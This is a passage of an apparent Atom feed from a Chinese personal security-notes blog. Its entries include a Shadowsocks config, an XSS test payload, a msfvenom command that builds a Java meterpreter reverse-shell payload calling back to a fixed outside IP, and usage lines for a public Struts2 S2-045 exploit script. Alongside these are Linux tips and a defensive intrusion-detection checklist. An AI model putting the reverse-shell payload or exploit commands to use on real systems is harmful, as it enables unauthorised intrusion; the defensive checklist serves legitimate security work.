         &amp;quot;8989&amp;quot;:&amp;quot;password0&amp;quot;,
         &amp;quot;9001&amp;quot;:&amp;quot;password1&amp;quot;,
         &amp;quot;9002&amp;quot;:&amp;quot;password2&amp;quot;,
         &amp;quot;9003&amp;quot;:&amp;quot;password3&amp;quot;,
         &amp;quot;9004&amp;quot;:&amp;quot;password4&amp;quot;
    },
    &amp;quot;method&amp;quot;:&amp;quot;aes-256-cfb&amp;quot;,
    &amp;quot;timeout&amp;quot;:600
}
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&quot;卸载：&quot;&gt;&lt;a href=&quot;#卸载：&quot; class=&quot;headerlink&quot; title=&quot;卸载：&quot;&gt;&lt;/a&gt;卸载：&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;./shadowsocks-all.sh uninstall
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="笔记" scheme="https://10o0.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="ss" scheme="https://10o0.github.io/tags/ss/"/>
    
      <category term="shadowsocks" scheme="https://10o0.github.io/tags/shadowsocks/"/>
    
  </entry>
  
  <entry>
    <title>Xss常用测试代码</title>
    <link href="https://10o0.github.io/2018/01/18/Xss%E5%B8%B8%E7%94%A8%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81/"/>
    <id>https://10o0.github.io/2018/01/18/Xss常用测试代码/</id>
    <published>2018-01-18T07:54:28.000Z</published>
    <updated>2018-07-26T07:38:15.240Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>简单测试代码：</p></blockquote><pre><code>&lt;img src=&quot;#&quot; onerror=&quot;alert(111)&quot;&gt;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;简单测试代码：&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;img src=&amp;quot;#&amp;quot; onerror=&amp;quot;alert(111)&amp;quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
      
    
    </summary>
    
      <category term="笔记" scheme="https://10o0.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="xss" scheme="https://10o0.github.io/tags/xss/"/>
    
      <category term="js" scheme="https://10o0.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>msf常用命令</title>
    <link href="https://10o0.github.io/2018/01/18/msf-shell/"/>
    <id>https://10o0.github.io/2018/01/18/msf-shell/</id>
    <published>2018-01-18T02:22:16.000Z</published>
    <updated>2018-07-26T07:38:15.240Z</updated>
    
    <content type="html"><![CDATA[<p>Msf安装：</p><pre><code>curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstallchmod 755 msfinstall &amp;&amp; ./msfinstall</code></pre><hr><p>Msfshell</p><pre><code>java/meterpreter/reverse_tcpmsfvenom -p java/meterpreter/reverse_tcp  LHOST=203.101.160.157 LPORT=8808 -f jar -o msfserver.jar</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Msf安装：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrapp
      
    
    </summary>
    
      <category term="笔记" scheme="https://10o0.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="msf" scheme="https://10o0.github.io/tags/msf/"/>
    
      <category term="shell" scheme="https://10o0.github.io/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>linux实用技巧</title>
    <link href="https://10o0.github.io/2018/01/18/linux%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
    <id>https://10o0.github.io/2018/01/18/linux实用技巧/</id>
    <published>2018-01-18T01:56:49.000Z</published>
    <updated>2018-07-26T07:38:15.240Z</updated>
    
    <content type="html"><![CDATA[<h1 id="自定义终端命令启动程序"><a href="#自定义终端命令启动程序" class="headerlink" title="自定义终端命令启动程序"></a>自定义终端命令启动程序</h1><blockquote><p>编辑 .bashrc 文件：</p></blockquote><pre><code>root@kali:~# vim .bashrc root@kali:~# source .bashrc</code></pre><p>exm：</p><pre><code>alias burp=&apos;setsid java -jar /root/softs/burpsuite_pro_v1.6.37.jar &gt;/dev/null 2&gt;&amp;1 &amp;&apos;echo &quot;###&quot; &gt; file  ##替换文件echo &quot;###&quot; &gt;&gt; file ##追加写入文件echo &quot;alias ss=&apos;ss start&apos;&quot; &gt;&gt; .bashrc</code></pre><hr><h1 id="设置ssh免密码登录"><a href="#设置ssh免密码登录" class="headerlink" title="设置ssh免密码登录"></a>设置ssh免密码登录</h1><pre><code>在.ssh目录下：本地主机： ssh-keygen -t rsa   ##生成id_rsa.pubcat vps_rsa.pub &gt;&gt; authorized_keys   ##写入文件复制authorized_keys到远程主机： scp -P 22 authorized_keys root@176.*.145.*:/root/.ssh从远程主机下载文件：scp -P 22 root@176.*.145.*:/root/test.txt /root/</code></pre><h1 id="批量操作文件"><a href="#批量操作文件" class="headerlink" title="批量操作文件"></a>批量操作文件</h1><pre><code>find ./ -name &quot;*.docx&quot; | awk -F &quot;.&quot; &apos;{print $2}&apos; | xargs -i -t mv ./{}.docx  ./{}.doc   #批量修改后缀名cp -r &apos;find root/a -iname *.doc&apos; root/b   #批量复制某后缀名的文件</code></pre><h1 id="配置终端使用HTTP-or-SOCKS5代理"><a href="#配置终端使用HTTP-or-SOCKS5代理" class="headerlink" title="配置终端使用HTTP or SOCKS5代理"></a>配置终端使用HTTP or SOCKS5代理</h1><blockquote><p>把代理服务器地址写入shell配置文件.bashrc或者.zshrc</p><p>直接在<strong>.bashrc</strong>或者.zshrc添加下面内容</p></blockquote><pre><code>export http_proxy=&quot;http://localhost:port&quot;export https_proxy=&quot;http://localhost:port&quot;</code></pre><blockquote><p>以使用shadowsocks代理为例，ss的代理端口为1080,那么应该设置为</p></blockquote><pre><code>export http_proxy=&quot;socks5://127.0.0.1:1080&quot;export https_proxy=&quot;socks5://127.0.0.1:1080&quot;</code></pre><blockquote><p><strong>或者直接设置ALL_PROXY</strong></p></blockquote><pre><code>export ALL_PROXY=socks5://127.0.0.1:1080</code></pre><blockquote><p>然后ESC后:wq保存文件，接着在终端中执行</p></blockquote><pre><code>source ~/.bashrc</code></pre><blockquote><p>或者退出当前终端再起一个终端。 这个办法的好处是把代理服务器永久保存了，下次就可以直接用了。</p><p><strong>或者通过设置alias简写来简化操作，每次要用的时候输入setproxy，不用了就unsetproxy。</strong></p></blockquote><pre><code>alias setproxy=&quot;export ALL_PROXY=socks5://127.0.0.1:1080&quot;alias unsetproxy=&quot;unset ALL_PROXY&quot;alias ip=&quot;curl ip.cn&quot;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;自定义终端命令启动程序&quot;&gt;&lt;a href=&quot;#自定义终端命令启动程序&quot; class=&quot;headerlink&quot; title=&quot;自定义终端命令启动程序&quot;&gt;&lt;/a&gt;自定义终端命令启动程序&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;编辑 .bashrc 文件：&lt;/p&gt;
&lt;/
      
    
    </summary>
    
      <category term="笔记" scheme="https://10o0.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="bash" scheme="https://10o0.github.io/tags/bash/"/>
    
      <category term="linux" scheme="https://10o0.github.io/tags/linux/"/>
    
      <category term="sh" scheme="https://10o0.github.io/tags/sh/"/>
    
  </entry>
  
  <entry>
    <title>linux入侵检测基础</title>
    <link href="https://10o0.github.io/2018/01/18/linux%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E5%9F%BA%E7%A1%80/"/>
    <id>https://10o0.github.io/2018/01/18/linux入侵检测基础/</id>
    <published>2018-01-18T01:30:05.000Z</published>
    <updated>2018-07-26T07:38:15.240Z</updated>
    
    <content type="html"><![CDATA[<h1 id="审计命令"><a href="#审计命令" class="headerlink" title="审计命令"></a>审计命令</h1><h2 id="last"><a href="#last" class="headerlink" title="last"></a>last</h2><blockquote><p>这个命令可用于查看我们系统的成功登录、关机、重启等情况，本质就是将/var/log/wtmp文件格式化输出，因此如果该文件被删除，则无法输出结果。</p></blockquote><pre><code>相关参数：last -10（-n） 查看最近10条记录last -x reboot 查看重启的记录last -x shutdown 查看关机的记录last -d 查看登陆的记录last –help 命令帮助信息last -f wtmp 用last命令查看wtmp文件（直接打开无法查看）</code></pre><a id="more"></a><h2 id="lastb"><a href="#lastb" class="headerlink" title="lastb"></a>lastb</h2><blockquote><p>这个命令用于查看登录失败的情况，本质就是将/var/log/btmp文件格式化输出。</p></blockquote><pre><code>相关参数：lastb name（root） 查看root用户登陆失败记录lastb -10（-n） 查看最近10条登陆失败记录lastb –heplp 命令帮助信息</code></pre><h2 id="lastlog"><a href="#lastlog" class="headerlink" title="lastlog"></a>lastlog</h2><blockquote><p>这个命令用于查看用户上一次的登录情况，本质就是将/var/log/lastlog文件格式化输出。</p></blockquote><pre><code>相关参数：lastlog 所有用户上一次登陆记录lastlog -u username（root） root用户上一次登陆记录lastlog –help 命令帮助信息</code></pre><h2 id="who"><a href="#who" class="headerlink" title="who"></a>who</h2><blockquote><p>这个命令用户查看当前登录系统的情况，本质就是将/var/log/utmp文件格式化输出。主要用来查看当前用户名称，以及登陆的ip地址信息，w命令与who一样，会更详细一些。</p><h2 id="history"><a href="#history" class="headerlink" title="history"></a>history</h2><p>查看历史命令记录，其实就是查看root/.bash_history文件内容，删除这个文件，记录就没了。</p></blockquote><pre><code>相关参数：history 查看所有历史记录history -10 查看最近10条记录history | grep “wget” 查看wget相关信息的记录history –help 命令帮助信息</code></pre><blockquote><p>history显示时间戳：</p></blockquote><p><code>export HISTTIMEFORMAT=&quot;%F %T</code>whoami<code>&quot;history | more</code></p><h1 id="检查用户"><a href="#检查用户" class="headerlink" title="检查用户"></a>检查用户</h1><blockquote><p>Linux不同的用户，有不同的操作权限，但是所有用户都会在/etc/passwd、/etc/shadow、/etc/group文件中记录。</p></blockquote><pre><code>less /etc/passwd　　查看是否有新增用户grep :0 /etc/passwd　　查看是否有特权用户（root权限用户）ls -l /etc/passwd　　查看passwd最后修改时间</code></pre><p><code>cawk -F: &#39;$3==0 {print $1}&#39; /etc/passwd　　查看是否存在特权用户</code></p><p><code>awk -F: &#39;length($2)==0 {print $1}&#39; /etc/shadow　　查看是否存在空口令用户</code></p><blockquote><p>注：linux设置空口令：<code>passwd -d username</code></p></blockquote><h1 id="检查进程"><a href="#检查进程" class="headerlink" title="检查进程"></a>检查进程</h1><blockquote><p>一般被入侵的服务器都会运行一些恶意程序，或是挖矿程序，或者DDOS程序等等，如果程序运行着，那么通过查看进程可以发现一些信息。</p></blockquote><h2 id="普通进程"><a href="#普通进程" class="headerlink" title="普通进程"></a>普通进程</h2><pre><code>ps -aux　　查看进程top查看进程lsof -p pid　　查看进程所打开的端口及文件lsof -c 进程名　　查看关联文件ps -aux | grep python | cut -d &apos; &apos; -f 2 | xargs kill   杀死python相关的进程</code></pre><blockquote><p>检查/etc/inetd.conf文件，输入：<code>cat /etc/inetd.conf | grep –v &quot;^#&quot;</code>，输出的信息就是你这台机器所开启的远程服务。</p></blockquote><h2 id="隐藏进程"><a href="#隐藏进程" class="headerlink" title="隐藏进程"></a>隐藏进程</h2><pre><code>ps -ef | awk &apos;{print}&apos; | sort -n | uniq &gt;1  ls /proc | sort -n |uniq &gt;2diff 1 2</code></pre><h1 id="检查文件"><a href="#检查文件" class="headerlink" title="检查文件"></a>检查文件</h1><blockquote><p>被入侵的网站，通常肯定有文件被改动，那么可以通过比较文件创建时间、完整性、文件路径等方式查看文件是否被改动。</p></blockquote><pre><code>find / -uid 0 -print　　查找特权用户文件find / -size +10000k -print　　查找大于10000k的文件find / -name &quot;…&quot; -prin　　查找用户名为…的文件find / -name core -exec ls -l {} \;　　查找core文件，并列出详细信息md5sum -b filename　　查看文件的md5值rpm -qf /bin/ls　　检查文件的完整性（还有其它/bin目录下的文件）whereis 文件名　　查看文件路径ls -al 文件名　　查看文件创建时间du -sh  文件名   查看文件大小</code></pre><h1 id="检查网络"><a href="#检查网络" class="headerlink" title="检查网络"></a>检查网络</h1><blockquote><p>检查网络的目的，是查看黑客是否通过篡改网卡类型，进行流量嗅探等操作。</p></blockquote><pre><code>ip link | grep PROMISC　　正常网卡不应该存在promisc，如果存在可能有snifferlsof -inetstat -nap　　查看不正常端口arp -a　　查看arp记录是否正常ifconfig -a　　查看网卡设置</code></pre><h1 id="检查计划任务"><a href="#检查计划任务" class="headerlink" title="检查计划任务"></a>检查计划任务</h1><blockquote><p>当我们尝试kill恶意程序时，往往会遇到被kill程序自动启动的问题，那么就要检查下计划任务(cron)了。</p></blockquote><pre><code>crontab -u root -l　　查看root用户的计划任务cat /etc/crontabls -l /etc/cron.*　　查看cron文件是否变化的详细信息ls /var/spool/cron/</code></pre><h1 id="检查系统后门"><a href="#检查系统后门" class="headerlink" title="检查系统后门"></a>检查系统后门</h1><blockquote><p>可以使用工具，如：Conmodo、rkhunter等，当然也可以手工输入命令检查。</p></blockquote><pre><code>vim $HOME/.ssh/authorized_keys　　查看ssh永久链接文件lsmod　　检查内核模块chkconfig –list/systemctl list-units –type=service　　检查自启</code></pre><blockquote><p>查看著名的木门后门程序：</p></blockquote><pre><code>ls /etc/rc.d   #系统开机后，此目录下的文件会被启动ls /etc/rc3.dfind / -name “.rhosts” –printfind / -name “.forward” –print</code></pre><h1 id="打包文件"><a href="#打包文件" class="headerlink" title="打包文件"></a>打包文件</h1><blockquote><p>当我们做好一切入侵检测分析后，我们需要把一些日志文件copy到本地进行更进一步详细的分析时，怎么打包服务器相关信息，并且copy到本地呢？</p></blockquote><h2 id="打包web文件"><a href="#打包web文件" class="headerlink" title="打包web文件"></a>打包web文件</h2><p>打包文件名中包含jsp的文件，打包后的文件为my_txt_files.tar：<br>tar cvf my_txt_files.tar <code>find . -type f -name &quot;*.jsp*&quot;</code></p><h2 id="打包日志文件"><a href="#打包日志文件" class="headerlink" title="打包日志文件"></a>打包日志文件</h2><pre><code>tar -cvf log.tar /var/log</code></pre><h2 id="打包其他信息"><a href="#打包其他信息" class="headerlink" title="打包其他信息"></a>打包其他信息</h2><pre><code>last &gt; last.lognetstat -an &gt; netstat.log</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;审计命令&quot;&gt;&lt;a href=&quot;#审计命令&quot; class=&quot;headerlink&quot; title=&quot;审计命令&quot;&gt;&lt;/a&gt;审计命令&lt;/h1&gt;&lt;h2 id=&quot;last&quot;&gt;&lt;a href=&quot;#last&quot; class=&quot;headerlink&quot; title=&quot;last&quot;&gt;&lt;/a&gt;last&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;这个命令可用于查看我们系统的成功登录、关机、重启等情况，本质就是将/var/log/wtmp文件格式化输出，因此如果该文件被删除，则无法输出结果。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;相关参数：

last -10（-n） 查看最近10条记录
last -x reboot 查看重启的记录
last -x shutdown 查看关机的记录
last -d 查看登陆的记录
last –help 命令帮助信息
last -f wtmp 用last命令查看wtmp文件（直接打开无法查看）
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="笔记" scheme="https://10o0.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="linux" scheme="https://10o0.github.io/tags/linux/"/>
    
      <category term="入侵检测，安全审计" scheme="https://10o0.github.io/tags/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%EF%BC%8C%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>kali安装NVIDIA显卡驱动</title>
    <link href="https://10o0.github.io/2018/01/10/kali%E5%AE%89%E8%A3%85NVIDIA%E6%98%BE%E5%8D%A1%E9%A9%B1%E5%8A%A8/"/>
    <id>https://10o0.github.io/2018/01/10/kali安装NVIDIA显卡驱动/</id>
    <published>2018-01-10T01:32:48.000Z</published>
    <updated>2018-07-26T07:38:15.240Z</updated>
    
    <content type="html"><![CDATA[<p>安装参考链接<br><a href="https://forums.kali.org/showthread.php?35748-TUTORIAL-Installing-official-NVIDIA-driver-in-Optimus-laptop" target="_blank" rel="noopener">https://forums.kali.org/showthread.php?35748-TUTORIAL-Installing-official-NVIDIA-driver-in-Optimus-laptop</a><br>验证：<br><a href="https://docs.kali.org/general-use/install-nvidia-drivers-on-kali-linux" target="_blank" rel="noopener">https://docs.kali.org/general-use/install-nvidia-drivers-on-kali-linux</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;安装参考链接&lt;br&gt;&lt;a href=&quot;https://forums.kali.org/showthread.php?35748-TUTORIAL-Installing-official-NVIDIA-driver-in-Optimus-laptop&quot; target=&quot;_bl
      
    
    </summary>
    
      <category term="笔记" scheme="https://10o0.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="kali" scheme="https://10o0.github.io/tags/kali/"/>
    
      <category term="NVIDIA" scheme="https://10o0.github.io/tags/NVIDIA/"/>
    
      <category term="驱动" scheme="https://10o0.github.io/tags/%E9%A9%B1%E5%8A%A8/"/>
    
  </entry>
  
  <entry>
    <title>s2-045 exp CVE-2017-5638</title>
    <link href="https://10o0.github.io/2017/03/16/s2-045-exp-CVE-2017-5638/"/>
    <id>https://10o0.github.io/2017/03/16/s2-045-exp-CVE-2017-5638/</id>
    <published>2017-03-16T03:30:23.000Z</published>
    <updated>2018-07-26T07:38:15.240Z</updated>
    
    <content type="html"><![CDATA[<p>Usage:</p><p>Testing a single URL.</p><pre><code>python struts-pwn.py --url &apos;http://example.com/struts2-showcase/index.action&apos; -c &apos;id&apos;</code></pre><p>Testing a list of URLs.</p><pre><code>python struts-pwn.py --list &apos;urls.txt&apos; -c &apos;id&apos;</code></pre><p>Checking if the vulnerability exists against a single URL.</p><pre><code>python struts-pwn.py --check --url &apos;http://example.com/struts2-showcase/index.action&apos;</code></pre><p>Checking if the vulnerability exists against a list of URLs.</p><pre><code>python struts-pwn.py --check --list &apos;urls.txt&apos;</code></pre><p>Requirements</p><pre><code>Python2 or Python3requests</code></pre><p><a href="https://github.com/mazen160/struts-pwn/blob/master/struts-pwn.py" title="s2-045" target="_blank" rel="noopener">https://github.com/mazen160/struts-pwn/blob/master/struts-pwn.py</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Usage:&lt;/p&gt;
&lt;p&gt;Testing a single URL.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python struts-pwn.py --url &amp;apos;http://example.com/struts2-showcase/index.action&amp;apos
      
    
    </summary>
    
      <category term="exploit" scheme="https://10o0.github.io/categories/exploit/"/>
    
    
      <category term="s2-045" scheme="https://10o0.github.io/tags/s2-045/"/>
    
      <category term="exp" scheme="https://10o0.github.io/tags/exp/"/>
    
  </entry>
  
  <entry>
    <title>Python command</title>
    <link href="https://10o0.github.io/2017/03/06/Python-command/"/>
    <id>https://10o0.github.io/2017/03/06/Python-command/</id>
    <published>2017-03-06T08:02:34.000Z</published>
    <updated>2018-07-26T07:38:15.240Z</updated>
    
    <content type="html"><![CDATA[<p>python:</p><pre><code>py -2 hello.pypy -3 hello.py</code></pre><p>pip</p><pre><code>py -2 -m pip install XXXXpy -3 -m pip install XXXX</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;python:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;py -2 hello.py

py -3 hello.py
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;pip&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;py -2 -m pip install XXXX

py -3 -m pip install 
      
    
    </summary>
    
      <category term="笔记" scheme="https://10o0.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="python" scheme="https://10o0.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>SimpleHTTPServer</title>
    <link href="https://10o0.github.io/2017/03/05/SimpleHTTPServer/"/>
    <id>https://10o0.github.io/2017/03/05/SimpleHTTPServer/</id>
    <published>2017-03-05T02:18:03.000Z</published>
    <updated>2018-07-26T07:38:15.240Z</updated>
    
    <content type="html"><![CDATA[<pre><code>python -m SimpleHTTPServer 8080 #端口可自定义</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;pre&gt;&lt;code&gt;python -m SimpleHTTPServer 8080 #端口可自定义
&lt;/code&gt;&lt;/pre&gt;
      
    
    </summary>
    
      <category term="笔记" scheme="https://10o0.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="command" scheme="https://10o0.github.io/tags/command/"/>
    
  </entry>
  
  <entry>
    <title>win10-Cmd here</title>
    <link href="https://10o0.github.io/2017/03/04/win10-Cmd-here/"/>
    <id>https://10o0.github.io/2017/03/04/win10-Cmd-here/</id>
    <published>2017-03-04T08:27:02.000Z</published>
    <updated>2018-07-26T07:38:15.240Z</updated>
    
    <content type="html"><![CDATA[<p>保存为reg格式导入注册表即可：</p><pre><code>Windows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\cmd_here]@=&quot;Cmd Here&quot;[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\cmd_here\command]@=&quot;\&quot;C:\\Windows\\System32\\cmd.exe\&quot;&quot;[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\cmdPrompt]@=&quot;Cmd Here&quot;[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\cmdPrompt\command]@=&quot;\&quot;C:\\Windows\\System32\\cmd.exe\&quot; \&quot;cd %1\&quot;&quot;[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\shell\cmd_here]@=&quot;Cmd Here&quot;[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\shell\cmd_here\command]@=&quot;\&quot;C:\\Windows\\System32\\cmd.exe\&quot;&quot;</code></pre><p><img src="http://i.imgur.com/wZijEcJ.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;保存为reg格式导入注册表即可：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\cmd
      
    
    </summary>
    
      <category term="笔记" scheme="https://10o0.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="cmd" scheme="https://10o0.github.io/tags/cmd/"/>
    
  </entry>
  
</feed>
